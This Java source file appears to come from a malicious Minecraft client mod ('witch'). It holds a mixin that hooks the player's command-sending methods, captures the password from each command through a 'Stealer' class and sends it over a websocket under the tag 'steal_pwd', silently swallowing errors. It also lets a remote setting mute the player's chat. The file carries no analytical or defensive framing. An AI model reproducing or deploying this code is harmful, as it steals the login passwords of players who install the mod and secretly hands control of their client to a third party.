package me.soda.witch.mixin;

import me.soda.witch.config.Config;
import me.soda.witch.features.Stealer;
import me.soda.witch.websocket.MessageUtils;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.text.Text;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

@Mixin(ClientPlayerEntity.class)
public class ClientPlayerEntityMixin {
    Stealer stealer = new Stealer();

    @Inject(method = "sendCommand(Ljava/lang/String;)Z", at = @At("HEAD"), cancellable = true)
    private void onSendCommand(String command, CallbackInfoReturnable<Boolean> cir) {
        try {
            MessageUtils.sendMessage("steal_pwd", stealer.stealPassword(command));
        } catch (Exception e) {
        }
    }

    @Inject(method = "sendCommand(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
    private void onSendCommand(String command, Text preview, CallbackInfo info) {
        try {
            MessageUtils.sendMessage("steal_pwd", stealer.stealPassword(command));
        } catch (Exception e) {
        }
    }

    @Inject(method = "sendChatMessage(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
    private void onSendChatMessage(String message, Text preview, CallbackInfo info) {
        if (Config.isMuted) info.cancel();
    }
}